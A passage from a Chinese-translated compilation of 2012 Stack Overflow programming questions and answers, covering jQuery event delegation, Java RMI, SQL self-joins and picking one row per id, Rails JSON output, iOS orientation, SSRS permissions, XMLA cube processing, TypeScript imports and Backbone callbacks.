</ul> 
```

假设我想为每个列表项附加一个点击事件。我最终不得不像这样附加 6 个事件处理程序：

```
$('li').click(function(){
    alert('clicked!');
}); 
```

在幕后，jQuery 遍历每一个`li`并为其附加事件处理程序。如果有一种不那么浪费的方法来做到这一点，那就太好了......

这就是委托的用武之地。我可以只将一个处理程序附加到，它会在触发事件处理程序之前`ul`检查事件的目标是否与选择器匹配：`li`

```
$('ul').on("click","li",function(){
    alert('clicked!');
}); 
```

这比维护 6 个独立的相同事件处理程序更有效。

现在让我们看看你的情况。在您的情况下，您希望将事件处理程序附加到`#post-1`. 最有效的方法是直接附加一个事件处理程序`#post-1`，因为附加到父级并没有节省任何费用。

您不需要将处理程序附加到6 个单独`#post-1`的元素，因此委派事件没有意义。

# java - RMI unicodeRemoteObject 的多重继承

> ID：13599446
> 
> 赞同：0
> 
> 时间：2012-11-28T06:53:39.223
> 
> 标签：java, rmi

我正在尝试为远程方法调用编写服务器端代码。我正在编写一个**“rmiServer”**类，它是服务器上的一个类。
这个类已经在扩展另一个类。
现在，我想用**“unicodeRemoteObject”**类扩展这个类。
但问题是java不允许多重继承，那么我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:27:05.007

你不必扩展`UnicastRemoteObject.`，而是在你的构造函数中，调用`UnicastRemoteObject.exportObject().`效果是一样的。

# database - 查询自引用表

> ID：13599454
> 
> 赞同：0
> 
> 时间：2012-11-28T06:54:51.697
> 
> 标签：database, postgresql, join, view

假设我有这张简单的桌子

```
UserID|Name  |Aid ID
  1   |Bob   | 3
  2   |Alice | 1
  3   |Ted   | 4
  4   |Sam   | 2 
```

在查询中，我必须列出此人的姓名，以及他们帮助的人的姓名。我想过做一个视图，但我觉得这可以通过一个简单的查询来完成，而不是创建一个视图。我将如何做到这一点，以及查询是如何工作的，就像它背后的基本原理一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:56:42.080

您需要将表连接到自身

```
SELECT  a."UserID",
        a."Name",
        b."Name" As AIDName
FROM    tableName a
        INNER JOIN tableName b
            ON a."AidID" = b."UserID" 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!12/305d6/4)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:00:36.083

查询将是

```
select persons.name,aid.name 
from your_tablename as persons,
     your_tablename as aid
where persons.aidid=aid.userID 
```

# javascript - 比较文本字段和选择列表值和警报

> ID：13599460
> 
> 赞同：0
> 
> 时间：2012-11-28T06:55:18.670
> 
> 标签：javascript

我有一个文本字段，当屏幕加载时会在其中填充值，并且还有一个选择列表。

我的问题是当用户在选择列表中选择一个值并与文本字段进行比较并在不相等时触发警报消息。

请帮忙！

```
 JS:
function doType() 
{
    if (document.getElementById("Text1").value != document.getElementById("Select1").value) 
    alert(document.getElementById("Select1").value)
}

HTML:
<tr>
        <td align="right"><b>Select 1:</b></td>
        <td align=left>
           <select name="Select1" onChange="doType();"></select>
        </td>
        <td align="right"><b> Text 1:</b></td>
        <td align="left">
            <input name="Text1" type="text" size="10" maxlength="10">
        </td>
    </tr> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:17:54.223

JS：

```
function doType()
    {
      if(document.getElementById("Select1").value === document.getElementById("Text1").value){
        alert("Equal");
       }

      else{
       alert(" Not Equal");
      }
    } 
```

HTML：

```
<select id="Select1"onChange="doType();">
<option>Apple</option>
<option>Orange</option>
<option>Pineapple</option>
<option>Banana</option>
</select>

<input id="Text1" type="text" value="Apple"/> 
```

# ruby-on-rails - to_json 将单个对象包装在数组中？

> ID：13599462
> 
> 赞同：2
> 
> 时间：2012-11-28T06:55:28.170
> 
> 标签：ruby-on-rails, activerecord, sinatra

在我的 API 中，我通过以下方式将 ActiveRecord 对象转换为 json：

```
user.to_json :methods => :new_messages 
```

使用 irb，当我执行此语句时，我得到：

```
{someAttr: someValue, ....} 
```

这是完美的。这是一个单一的对象，所以它没有被包裹在一个数组中。现在，当我像这样在 sinatra 应用程序中运行它时：

```
get '/api/users/:fb_id' do |fb_id|
    user = User.where :fb_id => fb_id
    user.to_json :methods => :new_cookies
end 
```

它将它包装在一个数组中！！！像这样：

```
[{someAttr: someValue, ....}] 
```

我该如何解决这个问题，更重要的是，为什么？！？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:51:35.537

替换这一行：

```
user = User.where :fb_id => fb_id 
```

用这条线：

```
user = User.find_by_fb_id fb_id 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T08:26:03.697

只需使用[哈希。[]](http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-5B-5D)

```
 Hash[{a: :b}]
 # => {:a=>:b} 
```

> 更重要的是，为什么？！？

您在第二个示例中使用的是哪个 ORM？如果是 ActiveRecord，则`User.where :fb_id => fb_id`返回[ActiveRecord::Relation](http://api.rubyonrails.org/classes/ActiveRecord/Relation.html)对象，该对象在您调用`.to_json`. 它可以像这样固定

```
get '/api/users/:fb_id' do |fb_id|
  user = User.find_by_fb_id(fb_id)
  user.to_json :methods => :new_cookies
end 
```

# ios - MPMoviePlayer 控制器视图默认自动旋转到横向

> ID：13599466
> 
> 赞同：2
> 
> 时间：2012-11-28T06:56:11.133
> 
> 标签：ios, mpmovieplayercontroller, autorotate

我有两个视图控制器。一个视图有按钮，当用户单击该按钮时，他将重定向到存在 MPMoviePlayer 控制器的另一个视图。我想默认情况下将 MPMoviePlayer 控制器视图显示为 LandsapeRight 模式。

我在 buttonAction 中写了下面的代码

```
-(void)buttonAction
{

    tLive = [[toneTvlive alloc]init];
        [self.navigationController pushViewController:tLive animated:YES];
} 
```

在第二个视图中我写了下面的代码

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    printf("\n hii");
    self.navigationController.navigationBar.hidden = YES;
    [[UIApplication sharedApplication]setStatusBarHidden:NO];
    NSURL *mediaURL = [NSURL URLWithString:@""];
    mp = [[MPMoviePlayerController alloc] initWithContentURL:mediaURL];
    [[NSNotificationCenter defaultCenter] addObserver:self 
                                             selector:@selector(moviePlayBackDidFinish:) 
                                                 name:MPMoviePlayerPlaybackDidFinishNotification 
                                               object:nil];

    //[mp setControlStyle:MPMovieControlStyleFullscreen];
    [mp setMovieSourceType:MPMovieSourceTypeStreaming];
    [mp setFullscreen:YES animated:YES];

    [mp.view setFrame: CGRectMake(0,0, 480,320)];
    [self.view addSubview:mp.view];

    [mp prepareToPlay];
    [mp play];

}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    // Return YES for supported orientations.

    return (interfaceOrientation == UIInterfaceOrientationLandscapeRight);
} 
```

首先运行程序时，它仅以纵向模式显示视图。它不会提示视图以横向旋转，但是当我旋转设备后它工作正常。谁能帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T10:50:20.493

如果您使用的是 iOS 6+，您可以将视图控制器自动旋转为横向：

```
- (NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskLandscape;
}

- (BOOL)shouldAutorotate {
    return YES;
} 
```

如果您的目标是早期的 iO​​S 版本，这里有一个关于同一件事[的很好的答案。](https://stackoverflow.com/a/5363469/394561)

# sql-server - 授予用户 ' 的权限不足以执行此操作。(rsAccessDenied)

> ID：13599468
> 
> 赞同：0
> 
> 时间：2012-11-28T06:56:12.523
> 
> 标签：sql-server, reporting-services

我在 Win Server 2008 R2 上安装了 SSRS 2008 R2。一切都很好，我可以打开报告管理器和它的安全链接来定义新用户。我可以打开报表服务器页面，但是当我想在报表服务器上发布我的报表时，我遇到了这个问题：

```
C:\CalibrationReports>C:

C:\CalibrationReports>cd\CalibrationReports\

C:\CalibrationReports>rs.exe -i publishreports.rss -s  http://ndcalibration:8080/ReportServer_SQL2008 
```

> rsAccessDenied400授予用户“NDCALIBRATION\admin”的权限不足以执行此操作。http://go.microsoft.com/fwlink/?LinkId=20476&EvtSrc=Microsoft.ReportingServices.Diagnostics.Utilities.ErrorStrings&EvtID=rsAccessDenied&ProdName=Microsoft%20SQL% 20Server%20Reporting%20Services&ProdVer=10.50.1600.1Microsoft SQL Server Reporting Services10.50.1600.1127OsIndependent1033ReportingServicesLibrary授予用户“NDCALIBRATION\admin”的权限不足以执行此操作。System.Web.Services.Protocols.SoapException：授予用户“NDCALIBRATION\admin”的权限不足以执行此操作。---> Microsoft.ReportingServices.Diagnostics.Utilities.AccessDeniedException：授予用户“NDCALIBRATION\admin”的权限 不足以执行此操作。Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateFolder（字符串文件夹，字符串父级，属性 [] 属性）在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateFolder（字符串文件夹，字符串父级，属性 [] 属性）System.Web.Services。 Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateDataSource（字符串数据源，字符串父级，布尔覆盖，DataSourceDefinition 定义，属性 [] 属性）的 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateDataSource（字符串数据源，字符串父、布尔覆盖、DataSourceDefinition 定义、Property[] Properties) System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[] Properties, Warning[]& Warnings) 在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report,字符串父、布尔覆盖、字节 [] 定义、属性 [] 属性、警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> 微软。ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[] Properties, Warning[]& Warnings) 在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report,字符串父、布尔覆盖、字节 [] 定义、属性 [] 属性、警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport（字符串报告，Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[]属性，警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[] Properties, Warning[]& Warnings) 在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report,字符串父母，布尔覆盖，字节 [] 定义，属性 [] 属性，警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[] Properties, Warning[]& Warnings) 在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report,字符串父、布尔覆盖、字节 [] 定义、属性 [] 属性、警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> 微软。ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport(String Report, String Parent, Boolean Overwrite, Byte[] Definition, Property[] Properties, Warning[]& Warnings) 在 Microsoft.ReportingServices.WebServer.ReportingService2005.CreateReport(String Report,字符串父、布尔覆盖、字节 [] 定义、属性 [] 属性、警告 [] 和警告） System.Web.Services.Protocols.SoapException：找不到项目“/CalibrationReports”。---> Microsoft.ReportingServices.Diagnostics.Utilities.ItemNotFoundException：找不到项目“/CalibrationReports”。在 Microsoft.ReportingServices.WebServer.ReportingService2005Impl.CreateReport（字符串报告，

有谁知道原因？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-29T21:26:57.700

希望这对你有用！

编辑`rsreportserver.config`文件

1.  打开`rsreportserver.config`位于 的文件`D:\Program Files\Microsoft SQL Server\MSRS11.MSSQLSERVER\Reporting Services\ReportServer`。
2.  按 CTRL+F 查找`RSWindowsNegotiate`。
3.  替换`RSWindowsNegotiate`为`RSWindowsBasic`。保存文件并启动 URL。

# file - 从 XSSFWorkbook 对象创建文件对象

> ID：13599473
> 
> 赞同：1
> 
> 时间：2012-11-28T06:56:31.373
> 
> 标签：file, xls

我有`XSSFWorkbook`想要保存到特定位置的对象（使用 Amazon S3）。为了保存，我使用了一些带有 File 对象参数的 API。

我知道这会`XSSFWorkbook`暴露 write 方法来写入路径。有什么办法可以从`XSSFWorkbook`.

# ssis - SSIS中的全过程多维数据集

> ID：13599478
> 
> 赞同：0
> 
> 时间：2012-11-28T06:56:42.933
> 
> 标签：ssis, olap-cube, xmla

我有一个如下所示的 XMLA 脚本来处理（完整过程）多维数据集

```
<Object>
    <DatabaseID>Adventure Works DW Standard Edition</DatabaseID>
    <CubeID>Adventure Works DW</CubeID>
  </Object>
  <Type>ProcessFull</Type>
  <WriteBackTableCreation>UseExisting</WriteBackTableCreation>
</Process> 
```

这将完整处理维度还是我需要为维度编写另一个脚本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T13:01:46.813

此脚本只会处理您的多维数据集，而不是与之相关的维度。

一种可能的解决方案是处理整个数据库（假设它只包含一个多维数据集）。这样，其中的所有对象都将被处理。

```
<Batch xmlns="http://schemas.microsoft.com/analysisservices/2003/engine">
  <Parallel>
    <Process xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ddl2="http://schemas.microsoft.com/analysisservices/2003/engine/2" xmlns:ddl2_2="http://schemas.microsoft.com/analysisservices/2003/engine/2/2" xmlns:ddl100_100="http://schemas.microsoft.com/analysisservices/2008/engine/100/100" xmlns:ddl200="http://schemas.microsoft.com/analysisservices/2010/engine/200" xmlns:ddl200_200="http://schemas.microsoft.com/analysisservices/2010/engine/200/200">
      <Object>
        <DatabaseID>Adventure Works DW Standard Edition</DatabaseID>
      </Object>
      <Type>ProcessFull</Type>
      <WriteBackTableCreation>UseExisting</WriteBackTableCreation>
    </Process>
  </Parallel>
</Batch> 
```

# node.js - TypeScript VS 2012 插件不会为此特定代码生成 JavaScript

> ID：13599480
> 
> 赞同：0
> 
> 时间：2012-11-28T06:56:48.430
> 
> 标签：node.js, plugins, visual-studio-2012, typescript, web-essentials

我正在编辑器中编写此代码

```
 ///<reference path='../node/express3.d.ts' />
 ///<reference path='../node/node.d.ts' />
import http = module('http');
var reqRecieved = function (req, res): void {
    res.end();
};
var server = http.createServer(reqRecieved);
server.listen("1337");
console.log("server started"); 
```

问题是 TypeScript vs2012 插件没有生成相同的 JavaScript 代码。但如果我换行：

```
import http = module('http'); 
```

到线

```
var http = require('http'); 
```

然后它生成正常。

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T11:36:13.087

我会检查您是否安装了最新版本的 WebEssentials 2012，因为在构建 1.8 中未生成模块导入代码存在一些问题。*

此外，TS 中有一个奇怪的地方，模块内的导入不会生成代码：

```
export module test {
    import myMod = module("MyMod"); // Generates no JS output
    var class = myMod.someClass;
} 
```

但：

```
import myMod = module("MyMod"); // Outside the module. Generates JS as expected.

export module test {
     var class = myMod.someClass;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T09:08:08.373

如果您没有通过 Visual Studio 获得解释，有时可以帮助您点击命令行并查看正在发生的情况：

```
tsc --debug c:\path\to\yourfile.ts 
```

这可能会给你更详细的错误。

# sql - 每个 id 只选择一行

> ID：13599483
> 
> 赞同：1
> 
> 时间：2012-11-28T06:57:02.290
> 
> 标签：sql, sql-server

我想每个 ID 只取回一行，即使有多个行与一个 ID 相关联。

场景是数据反映了一个出售土地/房产的网站，并且对于每个列表，可能有多个图像与每个 ID 相关联。我只需要一个。

谢谢你。

根据要求，样本数据：

```
RowNumber   ID  UserID  CountryID   tbl_detailsID   Name    Description Price   AddressLine1    AddressLine2    City    State   Zip AddressGPS  Space   Amenities   Policies    URL DateEntered DateExpires NumViews    IsCompanyProperty   EnforceMinStay  IsOtherSite rate_Avg    isFeatured  DayPrice    ImageURL    Name    check_in    check_out   currency    bathroom_count  pet unit_size   elder   handicap    occupancy   bedroom_count   LinkURL smoking unit_size_Units property_Type   children    Minimum_stay    Minimum_stay_Unit   CountryName
2   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-007-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
3   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-006-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
4   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-005-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
5   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-004-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
6   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-003-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
7   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-002-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States
8   247586  1   1   161398  Beautiful Oceanfront Home in Cambria California Located on the Central Coast of California 10 minutes from Hearst Castle.
Phone 1: Toll Free (800) 240-2277
Phone 2: (805) 927-0306 (California, USA)
direct email contact: debbie (@) maisonsdecambria.com

Leopold Cove" is a beautiful Oceanfront Home located on the Central Coast of California. It has fabulous ocean views and access to the water from a private stairway. The living area has large plate glass windows that feature 180 degree views of the Pacific Ocean. A comfortable platform style bed & a warm, cozy fireplace are also located in the living area so you can relax for hours, or even days, enjoying the beauty that surrounds you. There is a full kitchen & a separate bedroom with 2 twin beds. The property also has a picnic area & places to sit, perhaps with a good book & a glass of wine while you watch the sunset. If you are a nature lover, you will enjoy the otters, seals & birdlife that we are privileged to have so close to us. During the gray whale migration times, this is a p     2183 Sherwood Drive     Cambria California  93428   35.544712|-121.095444               http://www.flipkey.com/cambria-vacation-rentals/p202618/    2012-10-01 10:52:00 2012-10-15 10:52:00 0   0   0   703 5.0 0   NULL    http://images1.flipkey.com/img/photos/302459/243298/large_302459-243298-001-1346943508.jpg  Beautiful Oceanfront Home in Cambria California         USD 1   Ask 0   Ask Ask 4   1   http://www.flipkey.com/cambria-vacation-rentals/p202618/    Ask     House   Ask 0   NULL    United States 
```

还有我正在构建的用于替换几百行临时表的 Omni-query I：

```
SELECT DISTINCT ROW_NUMBER() OVER(ORDER BY tbl_Properties.ID DESC) AS [RowNumber], tbl_Properties.ID, tbl_Properties.UserID, tbl_Properties.CountryID, tbl_Properties.tbl_detailsID, tbl_Properties.Name, 
tbl_Properties.[Description], tbl_Properties.Price, tbl_Properties.AddressLine1, tbl_Properties.AddressLine2, tbl_Properties.City, tbl_Properties.[State], tbl_Properties.Zip, tbl_Properties.AddressGPS,
 tbl_Properties.[Space],
 tbl_Properties.Amenities,
 tbl_Properties.Policies,
 tbl_Properties.URL,
 tbl_Properties.DateEntered,
 tbl_Properties.DateExpires,
 tbl_Properties.NumViews,
 tbl_Properties.IsCompanyProperty,
 tbl_Properties.EnforceMinStay,
 tbl_Properties.IsOtherSite,
 tbl_Properties.rate_Avg,
 tbl_Properties.isFeatured,
 tbl_Properties.DayPrice,
 tbl_Images.ImageURL,
 tbl_Details.Name,
 tbl_Details.check_in,
 tbl_Details.check_out,
 tbl_Details.currency,
 tbl_Details.bathroom_count,
 tbl_Details.pet,
 tbl_Details.unit_size,
 tbl_Details.elder,
 tbl_Details.handicap,
 tbl_Details.occupancy,
 tbl_Details.bedroom_count,
 tbl_Details.url As [LinkURL],
 tbl_Details.smoking,
 tbl_Details.unit_size_Units,
 tbl_Details.property_Type,
 tbl_Details.children,
tbl_Details.Minimum_stay,
tbl_Details.Minimum_stay_Unit,
 tbl_Countries.Name As [CountryName]
 FROM [tbl_Details] 
 INNER JOIN [tbl_Properties] ON [tbl_Details].[detailsID] = [tbl_Properties].[tbl_detailsID]
 INNER JOIN [tbl_Images] ON [tbl_Images].PropertyID = [tbl_Properties].ID
 INNER JOIN [tbl_Countries] ON [tbl_Countries].ID = [tbl_Properties].CountryID 
```

当然，查询本身还没有完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:15:53.737

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:11:09.423

在`SQL Server 2005+`你可以使用这个

```
use tempdb
go

create table tbl (id int, s varchar(50))
insert into tbl values (1,'qwe'),(1,'asd'), (1,'qwff'),(2,'ert'),(2,'ykf'),(3,'')

;with cte
AS
(
SELECT id,s, ROW_NUMBER() OVER (PARTITION BY id ORDER BY s ) n
FROM tbl
)
SELECT id,s
FROM CTE
WHERE n=1

drop table tbl 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:08:15.427

尝试这个：

```
SELECT TOP 1 * FROM
imagestable
WHERE imagestable.landID = <theID> 
```

这将返回表中属于该属性的第一个图像。

如果您想将所有属性信息作为单个记录返回，您可以将此查询与您的属性表进行 INNER JOIN。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T07:05:39.347

由于没有样本数据，您需要调整此响应以满足您的需求

```
select 
  Listings.*, SingleImage.Column1, SingleImage.Column2
from Listings
  cross apply (
    select top 1 *
    from Images
    where Listings.ListingID = Images.ListingID
    ) SingleImage 
```

这需要 SQL 2005 或更新版本（“交叉应用”才能工作）

也有一些方法可以让它在 SQL 2000 中工作，但它们的效率不高

# javascript - 骨干model.create不调用任何回调

> ID：13599484
> 
> 赞同：5
> 
> 时间：2012-11-28T06:57:05.857
> 
> 标签：javascript, backbone.js, backbone-model

我有以下代码来为集合创建新模型。底层数据存储是一个远程 API：

```
 var postCreationStatus = this.model.create(newPostModel, {
            wait : true     // waits for server to respond with 200 before adding newly created model to collection
        }, {
            success : function(resp){
                console.log('success callback');
                console.log(resp);
            },
            error : function(err) {
                console.log('error callback');
                console.log(err);
            }
        }); 
```

新模型被创建，我可以从数据库中确认这一点，但是成功和错误回调都没有被调用。

创建完成后，我想重定向用户。重定向过早地终止了 AJAX 请求，这就是为什么我使用成功回调很重要。

服务器以 JSON 响应`{ id : 11 }`和 HTTP 状态响应`200 OK`。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:45:20.767

查看主干代码，我意识到我对该`create()`函数的调用不正确。成功和错误回调需要在作为第二个参数传入的对象中，而不是作为第三个参数。更改后的工作片段是这样的：

```
